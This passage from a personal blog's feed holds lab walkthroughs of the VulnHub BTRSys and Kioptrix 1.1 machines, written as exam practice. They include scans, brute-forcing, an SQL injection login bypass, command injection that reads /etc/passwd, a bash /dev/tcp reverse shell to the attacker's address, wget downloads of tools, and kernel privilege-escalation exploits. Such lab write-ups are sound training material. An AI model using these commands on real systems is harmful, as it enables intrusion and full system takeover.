&lt;p&gt;Intense TCP all ports:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -p&lt;&#x2F;span&gt;&lt;span&gt; 1-65535&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -T4 -A -v&lt;&#x2F;span&gt;&lt;span&gt; 192.168.225.134
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Intense UDP all ports:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -sS -sU -T4 -A -v&lt;&#x2F;span&gt;&lt;span&gt; 192.168.225.134
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Slow comprehensive scan:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -sS -sU -T4 -A -v -PE -PP -PS80&lt;&#x2F;span&gt;&lt;span&gt;,443&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -PA3389 -PU40125 -PY -g&lt;&#x2F;span&gt;&lt;span&gt; 53&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --script &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;default or (discovery and safe)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; 192.168.225.134
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Started enumeration process:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dirb&lt;&#x2F;span&gt;&lt;span&gt; http:&#x2F;&#x2F;btrsys &amp;gt; dirb.log
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nikto -h&lt;&#x2F;span&gt;&lt;span&gt; 192.168.225.134 &amp;gt; nikto.log
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rabbit hole&lt;&#x2F;strong&gt; - VSftpd 3.0.3 is being hosted on port 21. Possible entry point.&lt;&#x2F;p&gt;
&lt;p&gt;After researching for a possible exploit, I ended up using hydra to brute force logins. Found a new account &lt;code&gt;ftp:ftp&lt;&#x2F;code&gt; but ended up no where useful.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rabbit hole&lt;&#x2F;strong&gt; - OpenSSHd 7.2p2 is being used on port 22. Possible entry point.&lt;&#x2F;p&gt;
&lt;p&gt;After researching for a possible exploit, I tried this user enumeration python script but it didn&#x27;t make sense to me as the timing suppose to be longer than usual.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;vuldb.com&#x2F;?id.89622&quot;&gt;https:&#x2F;&#x2F;vuldb.com&#x2F;?id.89622&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Found an entry in &lt;code&gt;robots.txt&lt;&#x2F;code&gt; that contained a &lt;code&gt;wordpress&lt;&#x2F;code&gt; directory.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;wp-admin&lt;&#x2F;code&gt; has default password set as &lt;code&gt;admin:admin&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;FAIL&lt;&#x2F;strong&gt; - Attempted to try and LFI and RFI using the media upload tool. Media upload tool doesn&#x27;t have proper permissions to write to uploads directory. Manual LFI doesn&#x27;t work either.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Found an already edited style.css file for the default Wordpress theme containing code for php reverse shell.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;Wordpress &amp;gt; Appearance &amp;gt; Themes &amp;gt; Editor
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc -nvlp&lt;&#x2F;span&gt;&lt;span&gt; 4444
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Executed the &lt;code&gt;style.css&lt;&#x2F;code&gt; file by entering the URL directory - &lt;a href=&quot;http:&#x2F;&#x2F;btrsys&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;style.css&quot;&gt;http:&#x2F;&#x2F;btrsys&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;style.css&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Shell obtained and &lt;code&gt;whoami&lt;&#x2F;code&gt; shows &lt;code&gt;www-data&lt;&#x2F;code&gt;. Attempting to privesc.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;python3 -c &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;import pty;pty.spawn(&amp;#39;&#x2F;bin&#x2F;bash&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;python&lt;&#x2F;code&gt; is missing on this system so &lt;code&gt;linprivchecker.py&lt;&#x2F;code&gt; throws an error when trying to run using &lt;code&gt;python3&lt;&#x2F;code&gt;. Ran &lt;code&gt;linenum.sh&lt;&#x2F;code&gt; script instead.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;root:rootpassword!&lt;&#x2F;code&gt; - mysql credentials found in &lt;code&gt;&#x2F;var&#x2F;www&#x2F;.bash_history&lt;&#x2F;code&gt; and &lt;code&gt;wp-config.php&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I thought about trying to brute force the login ssh credentials for btrisk account but decided to try privesc using kernel exploit:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;44298&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;44298&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Couldn&#x27;t compile the exploit on BTRSys because gcc is missing. Compiled the exploit on local machine, transferred to BTRSys, and executed the file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gcc&lt;&#x2F;span&gt;&lt;span&gt; 42298.c
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;chmod&lt;&#x2F;span&gt;&lt;span&gt; 777 a.out
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;.&#x2F;a.out
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;ROOTED!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;today-i-learned&quot;&gt;Today I learned&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;Discovered that you can&#x27;t run netdiscover on a tun0 interface. I had to use zenmap and figure out how to scan.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hydra -t&lt;&#x2F;span&gt;&lt;span&gt; 1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -C&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;usr&#x2F;share&#x2F;sparta&#x2F;wordlists&#x2F;ftp-default-userpass.txt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -vV&lt;&#x2F;span&gt;&lt;span&gt; btrsys ftp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;This command copies the path of where the exploit file is located so you can cp it later:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;searchsploit -p&lt;&#x2F;span&gt;&lt;span&gt; exploits&#x2F;linux&#x2F;local&#x2F;44298.c
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;efficient-commands&quot;&gt;Efficient commands&lt;&#x2F;h3&gt;
&lt;p&gt;nmap TCP simple scan:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -Pn -sS --stats-every&lt;&#x2F;span&gt;&lt;span&gt; 3m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --max-retries&lt;&#x2F;span&gt;&lt;span&gt; 1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --max-scan-delay&lt;&#x2F;span&gt;&lt;span&gt; 20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --defeat-rst-ratelimit -T4 -p1-65535 -oN&lt;&#x2F;span&gt;&lt;span&gt; nmap-tcp-simple.log BTRsys
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;nmap TCP detailed scan:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -nvv -Pn- -sSV -p&lt;&#x2F;span&gt;&lt;span&gt; 21,22,80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --version-intensity&lt;&#x2F;span&gt;&lt;span&gt; 9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -A -oN&lt;&#x2F;span&gt;&lt;span&gt; nmap-tcp-details.log BTRsys
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;nmap UDP scan:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -Pn --top-ports&lt;&#x2F;span&gt;&lt;span&gt; 1000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -sU --stats-every&lt;&#x2F;span&gt;&lt;span&gt; 3m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --max-retries&lt;&#x2F;span&gt;&lt;span&gt; 1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -T3 -oN&lt;&#x2F;span&gt;&lt;span&gt; nmap-udp.log BTRsys
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;improvement-for-next-time&quot;&gt;Improvement for next time&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;When reading the results of the enumeration process, do the really easy ones first before driving into finding software exploits such as directory paths in &lt;code&gt;robots.txt&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Always navigate to a path that&#x27;s writable (&#x2F;tmp) once you get reverse shell.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I have to figure out how to speed up the scanning process. I feel like I&#x27;m using a big gun to do such a simple job.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Falling into rabbit holes too easily. I should scope out the difficulty of the exploit before diving into it. If it looks too complicated, it&#x27;s too hard for the OSCP exam already I would think. Although, it&#x27;s good practice to see how this stuff works. I&#x27;m not sure what exactly I&#x27;m reading but I should know when is a rabbit hole or not.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I found out afterwards that gcc is installed on the machine but cannot be executed due to restricted permissions.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Kioptrix 1.1</title>
        <published>2019-02-01T00:00:00+00:00</published>
        <updated>2019-02-01T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/vulnhub-kioptrix11/" type="text/html"/>
        <id>https://johntuyen.com/posts/vulnhub-kioptrix11/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Ran &lt;code&gt;netdiscover&lt;&#x2F;code&gt; to discover the IP address of the machine.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Used nmap TCP scan:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -vv -Pn -A -sS -T4 -p- -oN&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;root&#x2F;tcpscan.txt 192.168.225.132
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Used nmap UDP scan:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nmap -vv -Pn -A -sU -T4 -p- -oN&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;root&#x2F;udpscan.txt 192.168.225.132
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Used Firefox to navigate to port 80 and found a form asking for username and password.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Started enumeration process:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dirb&lt;&#x2F;span&gt;&lt;span&gt; http:&#x2F;&#x2F;192.168.225.132
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nikto -h&lt;&#x2F;span&gt;&lt;span&gt; 192.168.225.132
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Used SQL injection bypass cheat sheet and successfully bypassed the form using:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;admin&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; or &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pentestlab.blog&#x2F;2012&#x2F;12&#x2F;24&#x2F;sql-injection-authentication-bypass-cheat-sheet&#x2F;&quot;&gt;https:&#x2F;&#x2F;pentestlab.blog&#x2F;2012&#x2F;12&#x2F;24&#x2F;sql-injection-authentication-bypass-cheat-sheet&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Found another form that contains a ping tool. Used command injection to successfully run another command using:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;google.ca&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cat&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;etc&#x2F;passwd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Getting shell access by refining the command injection - &lt;a href=&quot;http:&#x2F;&#x2F;pentestmonkey.net&#x2F;cheat-sheet&#x2F;shells&#x2F;reverse-shell-cheat-sheet&quot;&gt;http:&#x2F;&#x2F;pentestmonkey.net&#x2F;cheat-sheet&#x2F;shells&#x2F;reverse-shell-cheat-sheet&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Setup netcat on Kali:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc -nvlp&lt;&#x2F;span&gt;&lt;span&gt; 8080
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Execute the command injection from browser:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;localhost&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bash -i &lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;10.242.2.3&#x2F;8080 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Check account privileges - &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;reider-roque&#x2F;linpostexp&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;reider-roque&#x2F;linpostexp&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wget&lt;&#x2F;span&gt;&lt;span&gt; 10.242.2.3&#x2F;linuxprivchecker.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;.&#x2F;linuxprivchecker.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;FAIL&lt;&#x2F;strong&gt; - I got side tracked by trying to somehow edit the writable logwatcher cronjob with 777 permissions.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I dug around the system to see if I could find simple passwords.&lt;&#x2F;p&gt;
&lt;p&gt;Found password for MySQL user account &lt;code&gt;john:hiroshima&lt;&#x2F;code&gt; inside &lt;code&gt;index.php&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Investigated the MySQL databases using john&#x27;s account.&lt;&#x2F;p&gt;
&lt;p&gt;Found password for user account &lt;code&gt;root:hiroshima&lt;&#x2F;code&gt; account for MySQL. This was a fluke find as the hashes for John and Root account were the same.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;FAIL&lt;&#x2F;strong&gt; - Somehow I got the idea that I could try and escape to a root shell account from the MySQL command line&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bash
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;After thinking hard about what to do next, I finally resorted to linux kernel 2.6.9 exploit - &lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;9479&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;9479&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wget&lt;&#x2F;span&gt;&lt;span&gt; 10.242.2.3&#x2F;9479.c
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gcc&lt;&#x2F;span&gt;&lt;span&gt; 9479.c
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;.&#x2F;a.out
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;ROOTED MY FIRST BOX!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;today-i-learned&quot;&gt;Today I learned&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;python -m&lt;&#x2F;span&gt;&lt;span&gt; SimpleHTTPServer 80
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;php -S&lt;&#x2F;span&gt;&lt;span&gt; localhost:80
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
